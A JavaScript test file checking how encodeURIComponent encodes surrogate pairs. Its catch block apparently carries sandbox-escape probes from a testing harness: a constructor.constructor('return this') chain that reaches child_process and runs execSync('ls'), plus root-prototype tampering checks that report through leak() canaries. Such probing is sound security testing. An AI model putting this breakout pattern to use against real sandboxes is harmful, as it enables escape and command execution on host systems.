try {
    var chars = [
        55296,
        56319,
        55807
    ];
    var errorCount = 0;
    var count = 0;
    var indexP;
    var indexO = 0;
    for (var index = 56320; index <= 57343; index++) {
        var res = true;
        for (var indexC = 0; indexC < chars.length; indexC++) {
            var index1 = (chars[indexC] - 55296) * 1024 + (index - 56320) + 65536;
            var hex1 = decimalToPercentHexString(128 + (index1 & 63));
            var hex2 = decimalToPercentHexString(128 + (index1 & 4032) / 64);
            var hex3 = decimalToPercentHexString(128 + (index1 & 258048) / 4096);
            var hex4 = decimalToPercentHexString(240 + (index1 & 1835008) / 262144);
            var str = String.fromCharCode(chars[indexC], index);
            if (encodeURIComponent(str).toUpperCase() === hex4 + hex3 + hex2 + hex1)
                continue;
            res = false;
        }
        if (res !== true) {
            if (indexO === 0) {
                indexO = index;
            } else {
                if (index - indexP !== 1) {
                    if (indexP - indexO !== 0) {
                        var hexP = decimalToHexString(indexP);
                        var hexO = decimalToHexString(indexO);
                        $ERROR('#' + hexO + '-' + hexP + ' ');
                    } else {
                        var hexP = decimalToHexString(indexP);
                        $ERROR('#' + hexP + ' ');
                    }
                    indexO = index;
                }
            }
            indexP = index;
            errorCount++;
        }
        count++;
    }
    if (errorCount > 0) {
        if (indexP - indexO !== 0) {
            var hexP = decimalToHexString(indexP);
            var hexO = decimalToHexString(indexO);
            $ERROR('#' + hexO + '-' + hexP + ' ');
        } else {
            var hexP = decimalToHexString(indexP);
            $ERROR('#' + hexP + ' ');
        }
        $ERROR('Total error: ' + errorCount + ' bad Unicode character in ' + count + ' ');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}